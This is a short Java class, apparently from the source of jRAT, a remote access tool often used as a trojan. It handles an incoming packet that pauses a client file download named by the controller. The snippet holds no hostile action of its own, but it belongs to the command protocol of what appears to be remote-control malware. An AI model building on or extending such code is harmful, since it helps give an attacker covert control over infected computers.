package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.common.io.FileCache;

public class Packet102PauseClientDownload implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String file = con.readLine();
		
		FileCache.get(file).getRunnable().pause();
	}

}
